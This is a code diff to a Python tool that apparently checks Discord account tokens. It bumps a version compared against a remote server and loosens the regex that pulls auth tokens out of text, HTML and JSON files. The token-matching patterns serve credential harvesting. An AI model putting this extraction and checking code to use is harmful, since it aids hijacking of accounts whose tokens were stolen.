@@ -28,7 +28,7 @@ class Checker:
         self.url = "https://lililil.xyz/checker"
         self.file_types = [".txt", ".html", ".json"]
 
-        self.version = "3.5.1"
+        self.version = "3.5.2"
         try:
             self.param = requests.get(self.url).json()
             if self.param["latest_version"] != self.version:
@@ -88,9 +88,8 @@ Site with table and excel output: {Fore.CYAN}https://lililil.xyz{Fore.RESET}
 
     def parse_tokens(self, text):
         pre_parsed = []
-        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}", r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
-            for token in re.findall(regex, text):
-                pre_parsed.append(token)
+        for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]*", text):
+            pre_parsed.append(token)
         pre_parsed = list(dict.fromkeys(pre_parsed))
 
         for token in pre_parsed:
